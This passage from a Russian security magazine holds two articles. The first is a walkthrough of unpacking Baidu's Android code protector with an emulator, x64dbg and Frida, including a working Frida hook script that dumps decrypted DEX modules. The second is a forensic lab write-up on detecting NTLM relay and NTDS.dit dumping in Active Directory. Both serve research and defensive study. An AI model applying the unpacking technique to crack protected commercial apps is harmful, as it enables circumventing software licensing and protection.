способных  защитить  код  от   взлома,
и Baidu — один из них. Давай подробно
разберем     внутреннюю      архитектуру
и устройство этого навороченного мобиль‐
ного протектора.


           WARNING

                        Статья написана в исследовательских целях, име‐
                         ет ознакомительный характер и предназначена
                       для   специалистов  по  безопасности.  Автор
                      и редакция не несут ответственности за любой
                        вред, причиненный с применением изложенной
                        информации.  Использование  или  распростра‐
                      нение ПО без лицензии  производителя может
                           преследоваться по закону.


Если ты регулярно читаешь «Хакер», у тебя могло сложиться впечатление,
будто всякие хитрые протекторы, использующие обфускацию с шифрованием
кода, виртуализацию и прочие страшные антихакерские приемы, существуют
только для десктопных защит (типа Themida, WMProtect и им подобных).
А мобильные, в частности андроидовские, приложения практически без‐
защитны, в связи с чем ломаются легко и приятно, даже без помощи отладчи‐
ка в статике.
   Конечно же, это не так: под Android существует множество серьезных ком‐
мерческих решений, сложность и цена которых оправдывают сохранение
приватности кода. Разумеется, спрос рождает предложение, и специально
обученные люди (большей частью китайцы) успели напридумывать множество
протекторов, защищающих код мобильных приложений от взлома и реверса.
И конечно, тут же нашлись другие китайцы, которые исследуют подобные
протекторы на предмет уязвимостей и клепают инструменты для взлома.
   Например, лет десять назад простые студенты Гонконгского политех‐
нического института провели собственное исследование наиболее популяр‐
ных (китайских, как ты, наверное, догадался) протекторов Android-приложе‐
ний  и  даже  создали  собственный   пакет  DexHunter,  позволяющий
более‑менее успешно их обходить. Желающие могут подробно ознакомиться
с общими принципами построения таких протекторов и способами их обхода,
так сказать, из первых рук. Мы же, как обычно, перейдем от теории к практике
и разберем взлом одной из описанных авторами систем защиты — Baidu.
   Выбранный мною пример будет полезен еще и тем, что прогресс не стоит
на месте и защиты совершенствуются. В частности, актуальные версии Baidu
уже не обойти при помощи DexHunter и прочих инструментов реверс‑инже‐
нера. А значит, за неимением однокнопочного решения приходится мас‐
терить его собственной головой и руками, чем мы сегодня и займемся.


ИССЛЕДУЕМ ЗАДАЧУ

Итак, условие задачи. У нас имеется некое Android-приложение, работающее
с  экзотическим  железом.  Поддержка  этого  приложения  прекращена,
исходники недоступны. Требуется получить исходный код для последующего
анализа. Если ты уже немного знаком с отладкой и реверсом Android-при‐
ложений, наверняка умеешь пользоваться таким полезным инструментом,
как JEB. Загружаем в него наш .APK и для начала попытаемся найти в коде
ссылку на текстовую строку «Authentication Failed. Wrong password?», выс‐
какивающую при неправильном вводе пароля.





Пока все нормально, строка успешно найдена в ресурсах: она присутствует
там   в  явном   виде,  и  даже   идентификатор  ее   известен —
authentication_failed_wrong_password. А вот дальше все  становится
грустно: поиск этого идентификатора дает только варианты исходной строки
на языках народов мира, а ссылок на код нет ни малейших.





Спасибо хотя бы на том, что нам теперь известен шестнадцатеричный иден‐
тификатор искомой строки — 0x7f0f009a, по которому можно попробовать
попытаться найти ее в откомпилированном smali-коде. Однако здесь нас
тоже ждет разочарование — ни в одном из распакованных файлов проекта
подобная комбинация не встречается.
   Попутно мы обнаруживаем в разобранном проекте несколько интересных
вещей. В нем, по сути, нет кода, как‑либо связанного с функциями приложе‐
ния, — только вспомогательные библиотечные пакеты и ресурсы. Однако
в коде  присутствует  странный,  частично  обфусцированный класс com.
sagittarius вот с таким содержимым.





Код явно ссылается на нативные библиотеки baiduprotect, версии которых
под различные  архитектуры лежат в  подкаталогах Assets и Libraries.
Открыв для  примера  в  дизассемблере  IDA  версию  такой  библиотеки
под архитектуру x86, обнаруживаем, что внутри она состоит из криптованного
и виртуализованного кода чуть менее, чем полностью, и версии под осталь‐
ные архитектуры выглядят не лучше.





Это означает, что статическим анализом декомпилированного кода в нашем
случае не обойтись, — придется каким‑то образом загружать программу
в отладчик и исследовать работу защиты в динамике. Попробуем совместить
приятное с полезным и решить еще одну сопутствующую задачу. Ты, веро‐
ятно, уже слышал, что серьезные исследования мобильных приложений про‐
водятся на специально рутованных подопытных Android-устройствах, подклю‐
ченных к компьютеру через отладочные интерфейсы. А мы люди жадные
и небогатые, покупать телефон‑жертву специально для этой цели не будем.
   Попробуем решить нашу задачу, не выходя за рамки Windows-компьюте‐
ра, — будем использовать для этой цели Android-эмулятор. Для примера
возьмем популярный условно‑бесплатный эмулятор BlueStacks. Я выбрал
именно его по ряду соображений: во‑первых, как я сказал выше, он бесплат‐
ный, во‑вторых, прекрасно работает офлайн, а в‑третьих, поддерживает
отладочный интерфейс ADB (не буду отвлекаться от повествования, объ‐
ясняя, что это такое, — думаю, что ты все‑таки имеешь небольшой опыт
реверса и отладки под Android и читал соответствующие статьи). И что самое
главное, наше приложение прекрасно устанавливается и запускается на этом
эмуляторе, хотя, как пишут в интернете, далеко не каждый эмулятор воспри‐
нимает Baidu, как родной. А раз так, то включаем в нашем BlueStacks доступ
к отладочному интерфейсу ADB (напоминаю, для этого в настройках прог‐
раммы нужно установить флажок «Включить Android Debug Bridge (ADB)».
Заодно обращаем внимание на адрес подключения 127.0.0.1:5555.





Теперь загружаем и устанавливаем наше приложение в эмулятор (снова
не буду подробно останавливаться на этом моменте: все подробно описано в
интернете). После этого устанавливаем на свой компьютер Android Debug
Bridge и пробуем по инструкции подключиться к эмулятору. Если ты все сде‐
лал правильно, то команда adb devices покажет эмулятор в списке дос‐
тупных устройств.




Теперь можно подключиться к нему, выполнив команду adb -s emulator-
5554 shell. Это необязательно получится с первого раза, но если ты акку‐
ратно следовал инструкции, то рано или поздно подключение будет установ‐
лено. Выполнив команду ps, можно убедиться, что исследуемое приложение
запущено и находится в списке активных процессов.
   Раз так, попробуем проверить гипотезу, что расшифрованный ODEX-
образ защищенного приложения находится в памяти процесса и его можно
сдампить. На это указано в статье китайских студентов, кроме того, еще один
китаец утверждал, что ему удалось это сделать. Конечно, если бы это было
действительно так, все было бы чересчур просто. Возможно, лет десять
назад, когда писались эти инструкции, метод работал, но, к сожалению, не в
нашем случае. Я перепробовал все нагугленные способы дампа памяти про‐
цесса, и на BlueStacks у меня успешно сработал такой:


am dumpheap <process PID> /data/local/tmp/dump.bin

Однако в полученном файле dump.bin ни малейших следов распакованного
кода не обнаружилось. Похоже, мы вернулись на исходную: сдампить рас‐
шифрованные данные из памяти процесса нельзя, поскольку они там отсутс‐
твуют. Но что, если поискать эти данные не в памяти процесса, а в памяти
эмулятора? Ведь BlueStacks — это обычное Windows-приложение, можно
открыть его отладчиком x64dbg, получить доступ к памяти всех загруженных
в эмулятор процессов и даже отслеживать оттуда их работу и загрузку.
   Буквально на первом шаге по этому пути нас ожидает небольшая проб‐
лема: а к какому же процессу аттачиться? Запущенный эмулятор порождает
сразу  несколько  активных  процессов:  BstkSVC,  HD-Agent,  HD-Player,
BlueStacksServices (несколько экземпляров) и собственно Bluestacks (их
тоже, внезапно, несколько). Поскольку мы проверяем гипотезу, что рас‐
шифрованный образ  находится в памяти  процесса,  смотрим,  есть ли
в  памяти  шестнадцатеричные  идентификаторы  используемых  строк,
на  которые  нет  прямых  ссылок  в  распакованном  .APK   (0x7f0f009a,
0x7F0F0693, 0x7F0F0694 и так далее). Процедура достаточно муторная, ведь
нам надо убедиться, что это не случайное вхождение 32-битной последова‐
тельности, а именно ссылка на правдоподобный далвиковский код, в котором
используется эта константа. Но вот наше терпение вознаграждено — при‐
аттачившись к процессу HD-Player, мы видим вот такое вхождение константы
0x7F0F0694 (на скриншоте выделено красным).





ИЩЕМ РАСШИФРОВАННЫЙ ОБРАЗ

Почему нас заинтересовало именно это вхождение константы? Если вни‐
мательно посмотреть на соседний код, то предшествующие ей два байта (DW
0x314, выделено желтым) представляют собой опкод Dalvik-команды const
p1(v3),0x7F0F0694, что намекает на осмысленный код функции, начало
которой явно прослеживается несколькими строками выше:


.short 4    # Выделено оранжевым: Number of registers : 4
.short 3    # Выделено светло-зеленым: Size of input args (in
words) : 3
.short 2    # Выделено голубым: Size of output args (in words) : 2
.short 0    # Выделено черным: Number of try_items : 0
.int 0x23D82B   # Выделено синим: Адрес Debug info
.int 0x41       # Выделено темно-зеленым: Size of bytecode (in 16-
bit units): 0x41

Из этой информации мы даже видим смещения до Debug info функций, ана‐
лизируя которые и используя документацию по формату DEX мы можем
при известном старании найти адреса начала секций Code 0x26F914 (на сле‐
дующем рисунке выделено красным) и Debug Info 0x23A904 (на следующем
рисунке выделено синим). А по их вхождениям — найти секцию Map.





В этой секции  присутствует ссылка на саму себя  (0x4CC338, выделено
серым). По ней уже находится заголовок всего расшифрованного DEX-обра‐
за.





Казалось бы, теперь мы победили хитрых китайцев, остается только взять
из заголовка образа его размер (0x4CC414, выделено серым) и сдампить его
на диск для последующего препарирования. Однако и тут нас ждет страшный
облом. Хоть расшифрованный образ и  находится, по всей видимости,
в памяти HD-Player, но не одним непрерывным куском, а фрагментированно,
разбросанными блоками размером, кратным 0x1000 байт. Cобрать такую
мозаику руками чертовски сложно.
   Нет, не невозможно, несмотря на то что количество этих блоков может
быть свыше тысячи. Если хорошо поднапрячься и покопать виртуальную
машину BlueStacks (а она в основном содержится в модулях BstkVMM.dll,
BstkRT.dll и BstkDD.dll), то можно разработать массу хитрых вариантов
слежения за дисковыми операциями  виртуального  образа, в  частности
за выделением и чтением виртуальной памяти. В конце концов, можно даже
контролировать исполнение кода в виртуальной песочнице. Возможно, я ког‐
да‑нибудь разберу этот тернистый путь на конкретном примере в своей оче‐
редной статье, но не в этот раз, поскольку он все‑таки чертовски сложен.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      ОТЛОМ БАЙДЫ
         КАК УСТРОЕНА ЗАЩИТА ANDROID-
                  ПРИЛОЖЕНИЙ BAIDU





ПРИЗЫВАЕМ НА ПОМОЩЬ «ФРИДУ»

Перейдем к следующему еще не использованному нами инструменту — Frida.
Снова надеюсь на твою осведомленность, тем более про эту программу
«Хакер» уже рассказывал. Поэтому коснусь лишь сложностей и проблем, свя‐
занных с работой Frida в сочетании с эмулятором BlueStacks. А их немало,
и они весьма мерзкие.
   Скажем прямо: в интернете бытует мнение, что Frida — не для эмуляторов,
а BlueStacks ее вообще не поддерживает. Но мы любознательные и недовер‐
чивые, в связи с чем попробуем разобраться в этом сами. Главное препятс‐
твие установки сервера Frida на BlueStacks — отсутствие у последнего рута
«из коробки», а «Фриде», как известно, нужен именно рут или модифициро‐
ванное приложение. Это вообще не наш вариант, поскольку Baidu к модифи‐
кации относится болезненно и разбираться еще и с этой проблемой уж точно
не входит в наши планы.
  В интернете описано множество костыльных способов получения root
на эмуляторе BlueStacks, большая часть из которых не работает из‑за зак‐
рытой для записи файловой системы (эта проблема нам еще попортит крови
в дальнейшем). Поэтому не буду останавливаться на их обзоре, а приведу
наиболее простой метод, который лично у меня более‑менее заработал
на BlueStacks 4. Речь идет о BlueStacks Tweaker. Решение исключительно
для ленивых: ничего никуда копировать и собирать не надо, просто загружа‐
ешь программу с относительно дружественным интерфейсом, жмешь нес‐
колько кнопок — и твой BlueStacks рутован.
  Из плюсов — в эмуляторе теперь доступна команда su и работает при‐
ложение SuperSU, которым можно и нужно предоставить права суперполь‐
зователя для приложений ADB Shell. И если ты хочешь использовать эмулятор
терминала Termux для прохождения дальнейшего квеста установки Frida, то
ему тоже нужно прописать права по этой инструкции.
   Итак, мы преодолели первое препятствие на пути установки Frida на наш
эмулятор, но цена этого преодоления оказалась достаточно высока: переза‐
пустив рутованный BlueStacs, мы с ужасом обнаруживаем, что исследуемое
приложение перестало запускаться, — оно сразу молча закрывается. Baidu
наконец‑то понял, что сейчас его начнут ломать, и в ответ он принялся
саботировать работу программы.
   Казалось бы, смысл дальнейших телодвижений полностью отсутствует,
но на всякий случай загружаем эмулятор в x64dbg и проверяем наличие рас‐
шифрованного DEX в памяти эмулятора. И он там есть! Перед тем как совер‐
шить сеппуку, Baidu успевает‑таки расшифровать наш DEX, а значит, есть
смысл трудиться дальше, даже с учетом такой странной работы приложения.
   Вдобавок, выполнив команду ps, мы обнаруживаем, что приложение
не рушится окончательно, несмотря на то что его окно мгновенно захлопыва‐
ется при загрузке. Сам процесс в запущенном виде присутствует в общем
списке, поэтому продолжаем двигаться дальше.
   Теперь нам предстоит установить сервер Frida на эмулятор. C установкой
клиента на компьютер по инструкции никаких проблем не возникает, чего
не скажешь о сервере. Все приведенные выше инструкции предполагают
установку питона на Android-устройство и сборку сервера, но, к сожалению,
у BlueStacks и с этим возникают проблемы. Лично я сколько ни старался, так
и не смог пройти шаг pip install frida frida-tools.





В итоге я просто скачал уже скомпилированную версию Frida server под плат‐
форму x86 отсюда. Нужен именно сервер под x86, поскольку для BlueStacks
это родная платформа. Самое странное, что ARM-сервер тоже запустится
и даже будет работать, но чудить при этом станет изрядно. В общем, далее
действуем по инструкции — закидываем сервер в эмулятор:


adb push frida-server-16.5.6-android-x86 /data/local/tmp/frida-server

После этого в Termux или ADB Shell даем права и запускаем сервер su (после
этой команды курсор приглашения командной строки должен смениться
на #):


cd /data/local/tmp
chmod 755 frida-server
./frida-server

Проверяем работоспособность сервера, выполнив из командной строки
Windows команду frida-ps -U. Она тоже может сработать не с первого раза,
но, если все‑таки выдаст список процессов, в котором присутствует и наш
исследуемый, значит, этот этап мы прошли.
   Теперь для начала попробуем сдампить память процесса уже через Frida.
Для этого воспользуемся утилитой fridump. К сожалению, и на этот раз чуда
не происходит — в дампе памяти процесса никаких следов расшифрован‐
ного DEX нет. Это означает, что расшифрованный код присутствует в памяти
только на краткий миг между загрузкой с диска с расшифровкой и компиляци‐
ей. К счастью, у нас теперь под рукой прекрасный инструмент, с исполь‐
зованием которого мы можем внедряться в любые, даже самые интимные
места программы в любой момент ее исполнения. Давай подумаем, где
может быть слабое место у китайской защиты, бОльшая часть кода которой
зашифрована? Разумеется, это импортируемые символы. Ведь программа,
по сути, расшифровывает код, может, она использует при этом какие‑то стан‐
дартные  криптографические  библиотеки?  Снова  открываем  библиотеку
baiduprotect.so в IDA и смотрим, что именно она импортирует из стандар‐
тных библиотек.





К сожалению, никакой криптографии в списке импортируемых функций с ходу
не видно, однако бросаются в глаза сразу несколько функций работы с ком‐
прессией — inflate, uncompress и подобные. На использование компрес‐
сии как бы намекает и тот факт, что нам точно известен размер расшифро‐
ванного образа: 0x4CC414 — 5 030 932 байта. А бесхозных файлов такого
размера в .APK нету, да и внутри существующих DEX-образов пакета такой
размер скрыть негде.
   Самые подозрительные файлы (явно покриптованные или запакованные)
под названием baiduprotect*.jar находятся в каталоге Accets рядом
с библиотеками libbaiduprotect*.so, но они сильно меньше искомого раз‐
мера. Попробуем проверить эту гипотезу — трассируем вызовы uncompress
в запущенной программе. Как я говорил ранее, несмотря на закрытие прог‐
раммы при  запуске на рутованном BlueStacks, она  продолжает висеть
в активных процессах и ее видно при выполнении команды frida-ps -U.
   Сразу предупреждаю, что Frida сама по себе очень капризная штука, а в
сочетании с BlueStacks вообще может взбрыкивать непредсказуемо, поэтому
все действия надо выполнять крайне аккуратно:
 • подключиться к BlueStacks по ADB;
 • выполнив команду ps , убедиться, что исследуемое приложение запущено;
 • посмотреть его PID и классовое имя;
 • если у тебя установлен Termux, из него запустить su (курсор поменяется
   на # );
 • потом  запустить /data/local/tmp/frida-server  (можно /data/
  local/tmp/frida-server -D );
 • после чего из командной строки Windows выполнить команду frida-
  trace -i "uncompress" -U 4577(где 4577 — PID нашего процесса).

Frida-trace зависнет в ожидании, однако, если ткнуть в значок нашего при‐
ложения в BlueStacks, она выдаст три строки "uncompress", после которых
обнаруживается исключение в libbaiduprotect.so. Выходит, что при запус‐
ке приложения libbaiduprotect перед смертью трижды распаковывает
некий код.
   Поскольку в каталоге Assert именно три зашифрованных файла (точнее,
три пары) — baiduprotect1.jar (baiduprotect1.i.dex), baiduprotect2.
jar (baiduprotect2.i.dex) и baiduprotect3.jar (baiduprotect3.i.dex),
то, похоже, мы на верном пути. Чтобы окончательно убедиться в этом,
напишем скрипт внедрения и перехвата вызова uncompress.


ПИШЕМ СКРИПТ

Для этого заглянем в маны и посмотрим на параметры этого вызова. Собс‐
твенно, алгоритм скрипта будет следующий: на входе в uncompress мы
печатаем параметры dest (адрес буфера распакованных данных), destLen
(длину распакованных данных), source (адрес буфера упакованных данных),
sourceLen (длину упакованных данных). Ну и заодно адрес вызова, который
нам может потом пригодиться для анализа кода. Запоминаем адреса буфера
и счетчика распакованных данных, чтобы при выходе из функции сдампить их.
В итоге получается такой скрипт:


const f = Module.getExportByName('libz.so',
    // Отслеживаемая функция uncompress библиотеки libz.so
    'uncompress');
// Указатель на буфер распаковки
var buf;
// Указатель на счетчик распакованных байтов
var buflen;


// Дамп первых строк распакованных данных
function outputArray(data,len)
{
 var cnt=0;
 for (var i=0;i<10;i++)
 {
   var st="";
   if (cnt==len) break;
   for(var j=0;j<16;j++) {
     st+=('0' + (data[cnt] & 0xFF).toString(16)).slice(-2);
     st+=" ";
     cnt++;
     if (cnt==len) break;
   }
   console.log(st);
 }
}


Interceptor.attach(f, {
  // Код, выполняемый на входе в uncompress
  onEnter(args) {
    console.log('uncompress called from:\n' +
        // Откуда был вызов?
        Thread.backtrace(this.context, Backtracer.ACCURATE)
        .map(DebugSymbol.fromAddress).join('\n') + '\n');
    // Адрес буфера распаковки
    console.log('Bytef * dest: '+args[0]);
    // Указатель на счетчик распакованных байтов
    console.log('uLongf * destLen: '+args[1]);
    // Указатель на упакованные байты
    console.log('const Bytef * source: '+args[2]);
    // Длина упакованных данных
    console.log('uLong sourceLen: '+args[3]);
    // Запоминаем адрес буфера распаковки
    buf=args[0];
    // Запоминаем указатель на счетчик распакованных байтов
    buflen=args[1];
  },
  // Код, выполняемый на выходе в uncompress
  onLeave(retval) {
    console.log('uncompress exited\n');


    // Адрес буфера распаковки
    console.log('dest: '+buf);
    // Печатаем количество распакованных байтов
    console.log('destLen: '+buflen.readUInt());
    const data = buf.readByteArray(buflen.readUInt());
    // Дампим распакованные данные
    outputArray(new Uint8Array(data), buflen.readUInt());


  }
});

Сохраняем этот код в файл uncompress.js, который запускаем (аккуратно
выполнив все указанные выше шаги) из Windows-консоли следующей коман‐
дой:


frida -U -f <классовое имя нашего приложения, полученное командой ps>
 -l uncompress.js

В эмуляторе моргает и гаснет окошко запущенного приложения, и в консоль
вываливается следующая простыня логируемых данных:


uncompress called from:
0x899d80cc libbaiduprotect.so!0x130cc
0xbf6633d0


Bytef * dest: 0x891fb000
uLongf * destLen: 0xbf84fb3c
const Bytef * source: 0x88fc9010
uLong sourceLen: 0x20457f
uncompress exited


dest: 0x891fb000
destLen: 5030932
64 65 78 0a 30 33 35 00 ee ca ca fd a3 5a 33 c8
93 99 93 ac 92 3f be ac ef 15 ba f6 6f 07 58 cc
14 c4 4c 00 70 00 00 00 78 56 34 12 00 00 00 00
00 00 00 00 38 c3 4c 00 78 b1 00 00 70 00 00 00
ab 18 00 00 50 c6 02 00 fb 1e 00 00 fc 28 03 00
4e 3e 00 00 c0 9c 04 00 c0 78 00 00 30 8f 06 00
d8 11 00 00 30 55 0a 00 e4 33 40 00 30 90 0c 00
30 90 0c 00 32 90 0c 00 36 90 0c 00 39 90 0c 00
4b 90 0c 00 59 90 0c 00 5c 90 0c 00 60 90 0c 00
6b 90 0c 00 95 90 0c 00 9f 90 0c 00 06 91 0c 00


uncompress called from:
0x899d80cc libbaiduprotect.so!0x130cc
0xbf6633d0


Bytef * dest: 0x89158000
uLongf * destLen: 0xbf84fb3c
const Bytef * source: 0x89101010
uLong sourceLen: 0x29992
uncompress exited


dest: 0x89158000
destLen: 409340
64 65 78 0a 30 33 35 00 49 f9 37 58 e0 82 9b db
ac eb 66 8c 61 1c 3d 36 dc 7c f7 a6 6f e3 e4 59
fc 3e 06 00 70 00 00 00 78 56 34 12 00 00 00 00
00 00 00 00 2c 3e 06 00 5e 13 00 00 70 00 00 00
df 02 00 00 e8 4d 00 00 ed 04 00 00 64 59 00 00
1d 06 00 00 80 94 00 00 6d 0e 00 00 68 c5 00 00
76 01 00 00 d0 38 01 00 6c d7 04 00 90 67 01 00
90 67 01 00 92 67 01 00 c0 67 01 00 e0 67 01 00
48 68 01 00 4b 68 01 00 5d 68 01 00 63 68 01 00
6e 68 01 00 71 68 01 00 80 68 01 00 8f 68 01 00


uncompress called from:
0x899d80cc libbaiduprotect.so!0x130cc
0xbf6633d0


Bytef * dest: 0x89127000
uLongf * destLen: 0xbf84fb3c
const Bytef * source: 0x890e3010
uLong sourceLen: 0x165d4
uncompress exited


dest: 0x89127000
destLen: 196864
64 65 78 0a 30 33 35 00 60 cc 07 49 66 67 41 78
97 05 88 65 0e a4 0b ea 46 ae 87 88 dc 40 93 14
00 01 03 00 70 00 00 00 78 56 34 12 00 00 00 00
00 00 00 00 30 00 03 00 1b 07 00 00 70 00 00 00
d8 01 00 00 dc 1c 00 00 3b 02 00 00 3c 24 00 00
7c 02 00 00 00 3f 00 00 ac 06 00 00 e0 52 00 00
ce 00 00 00 40 88 00 00 00 5f 02 00 00 a2 00 00
3a 46 02 00 3c 46 02 00 40 46 02 00 43 46 02 00
46 46 02 00 49 46 02 00 4c 46 02 00 4f 46 02 00
52 46 02 00 55 46 02 00 58 46 02 00 5b 46 02 00

Мы видим, что действительно при вызове uncompress из libbaiduprotect.
so (код, из которого выполняется вызов RVA=0x130cc, тоже на этот момент
расшифрован) распаковываются три зашифрованных DEX-модуля. Это понят‐
но по заголовкам. Искомым модулем, судя по размеру, является самый боль‐
шой — первый. Можно даже сравнить заголовок с тем, который мы получили
при анализе памяти BlueStacks в x64dbg.





ВЫВОДЫ

Можно пить шампанское: мы победили хитрых китайцев, при этом ни один
Android-девайс не пострадал. В заключение я кратко расскажу о дальнейших
перспективах этого пути и великих проблемах, ожидающих тебя на нем.
   Начнем с плохих новостей: несмотря на то что мы получили на блюдечке
полный расшифрованный код модуля DEX одним куском, чтобы вытащить его
из Frida, тебе придется еще повозиться. Потому как дамп в консоли — это,
конечно, красиво и хорошо, но пять мегабайт бинарного кода так не извле‐
чешь.
   Разумеется, у Frida есть функция записи блока данных в файл  (File.
writeAllBytes), однако файл этот, по странному капризу разработчиков,
должен находиться в файловой системе Android-устройства, и его в лучшем
случае придется переносить на компьютер. При использовании BlueStacks
вдобавок  проблемой  является  общая  закрытость  файловой  системы
для записи, даже на рутованном виртуальном устройстве.
  К примеру, у меня не получилось записать из Frida файл даже в /data/
local/tmp, куда мы перед этим благополучно пересадили саму «Фриду».
Разумеется, твой пытливый ум найдет массу других обходных способов
извлекать распакованные данные, пусть это будет домашним заданием.
   Хорошая же новость заключается в том, что при использовании Frida сами
библиотеки перестают быть зашифрованным «черным ящиком». К примеру,
ничего не мешает из вышеприведенного скрипта сдампить код самого
libbaiduprotect в расшифрованном виде, проанализировать его и на его
основе написать, к примеру, свой собственный инструмент для расшифровки
DEX безо всякого эмулятора и Frida.
ВЗЛОМ





В этой статье я продемонстрирую две атаки
на  Active  Directory, опишу используемые
злоумышленниками  утилиты  и  расскажу
о ключевых индикаторах, на которые стоит
обратить  внимание  при  возникновении              sab3rt1le                                                                                        FORensics FOR fun ;)
подозрительной активности. Практические             @k0n70r4
задания будем выполнять на лабораторных
работах  Sherlocks  с  платформы  Hack
The Box.


             INFO

                      Эта статья — продолжение материала «Базовые
                             атаки на AD. Разбираем Kerberoasting, AS-REP
                         Roasting и LLMNR Poisoning».



NTLM RELAY

Windows New Technology LAN Manager (NTLM) — это название набора
протоколов  Active  Directory,  обеспечивающих  аутентификацию  в  сети.
Для поддержки обратной совместимости NTLM используется преимущес‐
твенно в системах, не поддерживающих аутентификацию Kerberos.
   Когда злоумышленник перехватывает сетевой трафик с помощью атаки
LLMNR Poisoning, он может также попытаться ретранслировать перехвачен‐
ное сообщение для аутентификации в той или иной службе от имени жертвы.
   Такая продвинутая версия LLMNR-отравления будет называться атакой
NTLM Relay, она соотносится с подтехникой T1557.001 в MITRE ATT&CK. Воз‐
можность такой атаки обусловлена тем, что сам NTLM не обеспечивает
безопасности сеанса.
   Утилита ntlmrelayx из набора Impacket — инструмент, которым чаще всего
пользуются для подобных атак.


Reaper
Лабораторная работа Reaper из раздела Sherlocks от Hack The Box поможет
на практике разобрать инцидент, связанный с этой атакой.
  В описании лабораторной рассказывается о подозрительном входе в сис‐
тему, на который необходимо срочно обратить внимание. Подробности зак‐
лючаются в том, что IP-адрес и имя исходной рабочей станции не совпадают.
  Для  определения  ретрансляции NTLM в сети  понадобятся  журналы
сетевой телеметрии и аудита входа в систему. Подход к обнаружению NTLM
Relay достаточно необычен, поскольку требует сопоставления IP-адресов
с именами хостов. В крупных корпоративных средах будет тяжело следить
за этим, так как список IP-адресов достаточно большой. Телеметрия сети
в таком случае сильно упростит определение скомпрометированного хоста.
   Reaper предоставляет дамп сетевого трафика компании, с его помощью
можно установить основные конечные точки в виде внутренних IP-адресов.
   Просмотрим  статистику .pcap-файла, определим внутрикорпоративную
сеть и уберем из подозреваемых различные широковещательные адреса
и шлюзы (IP-адреса, заканчивающиеся на .1, .2 и .255).





Получить имена  хостов можно с использованием службы имен NetBios
и одноименного фильтра в Wireshark — nbns.





Сразу же наблюдаем небольшой список имен хостов:
 1. FORELA-WKSTN001 для 172.17.79.129.
 2. FORELA-WKSTN002 для 172.17.79.136.
 3. Неизвестное устройство для 172.17.79.135.

Добавим фильтр для SMB-трафика, входящего и исходящего от подозритель‐
ного  хоста: smb2  and  ip.addr  ==  172.17.79.135. Пока что для нас
это машина злоумышленника, работающая по принципу MITM.





Видно, что пользователь arthur.kyle участвовал в процессе аутентифика‐
ции  с  подозрительного  IP-адреса.  Также  можно  наблюдать  IP-адрес
Wkstn002. Судя по трафику, пользователь является учеткой как раз этого хос‐
та, чьи данные и были украдены.
  В следующем потоке пакетов можно заметить, что аутентификация учет‐
ной записи пользователя arthur.kyle осуществляется с двух разных компь‐
ютеров (один — легитимный, второй — MITM).
   Проанализируем   предоставленный   журнал  событий  безопасности
от WKSTN001, предварительно отфильтровав события с идентификатором
4624.





Зная из анализа .pcap примерные временные рамки, не составит большого
труда найти подходящее событие и изучить его.





Отметим несколько индикаторов того, что атака NTLM Relay была проведена
успешно:
 • идентификатор безопасности: NULL SID;
 • LogonGUID имеет значение NULL;
 • несовпадение в имени рабочей  станции и  IP-адресе  источника  (на
   исходной рабочей станции указано WKSTN002, а в качестве IP-адреса
  видим 172.17.79.135);
 • процесс входа: NtLmSsp.

Обнаруженное нами событие подтверждает предположение о том, что неиз‐
вестный хост украл учетные данные WKSTN002 и использовал их для входа
на WKSTN001.


Меры предотвращения
По возможности необходимо отключить аутентификацию NTLM и исполь‐
зовать более надежные протоколы, такие как Kerberos. Чтобы исключить
перехват аутентификации через NTLM, во всем домене необходимо принуди‐
тельно использовать подпись SMB. Такая подпись защищает сообщения,
передаваемые между клиентом и сервером во время связи NTLM, предот‐
вращая перехват сообщений проверки подлинности.


NTDS DUMPING

Хранилище информации о доменах в службе каталогов Active Directory реали‐
зовано в файле NTDS.dit, который расположен по умолчанию в директории
%SystemRoot%\ntds\ на контроллере домена. Этот файл содержит важные
данные о домене, включая хеши паролей пользователей, что делает его
привлекательной целью для атак.
   Чтобы получить доступ к файлу NTDS.dit, злоумышленнику необходимо
обладать административными правами в системе. Если он получит доступ
к контроллеру домена, то сможет извлечь файл NTDS.dit вместе с данными
из ключа реестра HKEY_LOCAL_MACHINE\SYSTEM, содержащего все необ‐
ходимые сведения для дешифровки данных NTDS.dit.
    Хотя служба Active Directory запрещает доступ к этому файлу во время
работы, злоумышленник может воспользоваться службой создания теневых
копий томов (Volume Shadow Copy Service, VSS) для создания снимка тома
и  извлечения  файла NTDS.dit  из  него.  Также  можно  сделать копию
с помощью диагностического инструмента NTDSUTIL.exe, доступного в сос‐
таве Active Directory.
   Если злоумышленник имеет набор действительных учетных данных, он
может воспользоваться таким инструментом, как CrackMapExec, и удаленно
сбросить файл NTDS.dit, а после проанализировать его.
   После того как хакер похитит файл NTDS.dit и ключ реестра HKLM\SYSTEM,
он сможет проводить дальнейшие атаки без доступа к службе AD. Получив
хеши паролей из файла NTDS.dit, злоумышленник может попытаться подоб‐
рать пароли офлайн. Если не получится взломать хеши в автономном режиме,
он также может использовать их в атаках типа pass-the-hash для дальнейшего
продвижения в системе.
   Информация о домене из этих файлов может быть проанализирована
с использованием утилиты secretsdump, которая входит в состав набора инс‐
трументов Impacket.
  В MITRE ATT&CK эта атака относится к подтехнике T1003.003.


CrownJewel-1
В описании этой лабораторной работы указано, что при сбросе NTDS.dit
на контроллере домена была использована служба vssadmin. В таком случае
сперва  следует  обратить  внимание на события  журнала SYSTEM.evtx.
Отфильтруем события с идентификатором 7036, обозначающим смену сос‐
тояния служб.
  Мы обнаружим событие запуска Volume Shadow Copy, а в разделе под‐
робностей будет указано точное время начала работы службы, на которое
в будущем мы и станем ориентироваться.





В журнале безопасности при создании теневой копии тома также отобража‐
ются события, в которых VSSVC.exe проверяет права с помощью учетной
записи компьютера и перечисляет группы пользователей. Event ID 4799
логирует перечисление участия в защищенных локальных группах.
   Такие перечисления будут выполняться большое количество раз за пару
секунд, что вполне можно считать подозрительной активностью.





В найденных событиях важными индикаторами будут следующие:
 • перечисление групп администраторов и операторов резервного копиро‐
   вания (Administrators, Backup Operators);
 • имя процесса: VSSVC.exe.

В журнале Microsoft-Windows-Ntfs будет отображаться идентификатор ско‐
пированного тома и информация о времени сканирования.





Поскольку у нас имеется файл $MFT, содержащий в себе записи обо всех
папках в системе, в том числе и об удаленных, мы сможем определить путь
к дампу NTDS.dit.
   Воспользуемся утилитой MFTExplorer от Эрика Циммермана для прос‐
мотра $MFT. Очень часто злоумышленники оставляют используемые ими фай‐
лы в непримечательных папках: «Загрузки», «Документы», «Изображения».
Также можно поискать по словам ntds.dit, backup, dc sync, shadow copy.
  В нашем случае NTDS.dit обнаружился в папке «Документы» пользовате‐
ля Администратор.





Видно, что, помимо базы данных NTDS, был скопирован еще и куст реестра
